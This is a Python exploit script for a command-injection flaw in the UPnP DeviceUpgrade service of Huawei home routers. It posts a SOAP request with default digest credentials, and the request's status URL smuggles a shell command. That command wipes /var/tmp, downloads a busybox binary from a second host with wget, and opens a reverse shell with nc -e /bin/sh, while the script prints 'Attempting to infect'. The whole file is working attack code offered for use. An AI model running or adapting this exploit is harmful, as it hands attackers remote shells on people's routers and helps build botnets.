import threading, sys, time, random, socket, re, os, struct, array, requests
from requests.auth import HTTPDigestAuth

ip = '192.168.142.131'
cmd = 'rm -rf /var/tmp; mkdir /var/tmp; /usr/bin/wget -g -l /var/tmp/busybox-mips -r /busybox-mips 192.168.142.130; chmod 755 /var/tmp/busybox-mips; export PATH=$PATH:/var/tmp; busybox-mips nc 192.168.142.130 8898 -e /bin/sh'

rm = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>http://$(" + cmd + ")</NewStatusURL>	\n<NewDownloadURL>http://$(echo HUAWEIUPNP)</NewDownloadURL>	\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"

class exploit(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1"
				requests.post(url, timeout=10, auth=HTTPDigestAuth('dslf-config', 'admin'),headers={'Content-Type': 'text/xml ; charset="utf-8"'}, data=rm)
				print("[SOAP] Attempting to infect " + self.ip)
			except Exception as e:
				print(e)
				pass

def main():
	try:
		n = exploit(ip)
		n.start()
		time.sleep(0.03)
	except Exception as e:
		print(e)

if __name__ == "__main__":
    main()
